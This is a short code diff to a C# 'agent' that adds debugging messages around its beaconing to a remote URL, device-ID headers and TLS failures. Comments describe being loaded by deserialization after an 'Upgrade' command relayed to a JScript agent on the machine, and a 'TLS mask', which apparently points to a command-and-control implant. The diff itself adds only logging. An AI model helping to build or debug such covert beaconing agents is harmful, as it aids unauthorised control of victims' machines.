@@ -60,8 +60,11 @@ namespace CSharpAgent
             Log("beaconing to " + beaconUrl + " as " + (uuid != "" ? uuid : "an unidentified machine"));
             // [5] — if [3] showed and this never does, Identity.Build threw (WMI/registry
             // access on the box) and the TypeInitializationException killed the process.
+            // The sanitized:… note names the header whose raw value carried control/OEM
+            // bytes — the ArgumentException that used to kill POST #1 before any I/O.
             Diag.Show("[5] identity", "headers built — beaconing as " +
-                (uuid != "" ? uuid : "AN UNIDENTIFIED MACHINE (empty X-Device-Id)"));
+                (uuid != "" ? uuid : "AN UNIDENTIFIED MACHINE (empty X-Device-Id)") +
+                (Identity.LastCleaningNote != "" ? "\n" + Identity.LastCleaningNote : ""));
 
             // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B Upgrade command
             // that the relay already delivered to the JScript agent on this machine; the
@@ -86,7 +89,9 @@ namespace CSharpAgent
                 catch (Exception ex)
                 {
                     Diag.Show("[exit] POST #" + post + " threw",
-                        Diag.Describe(ex) + "\n\nOn Win7 look for SecureChannelFailure — that is the TLS mask/schannel brick.");
+                        Diag.Describe(ex) +
+                        "\n\nno inner chain, died before any bytes hit the wire = request SETUP (a header value — see [5]); " +
+                        "SecureChannelFailure = the TLS mask/schannel brick");
                     Log("beacon failed — stopping");
                     return;
                 }
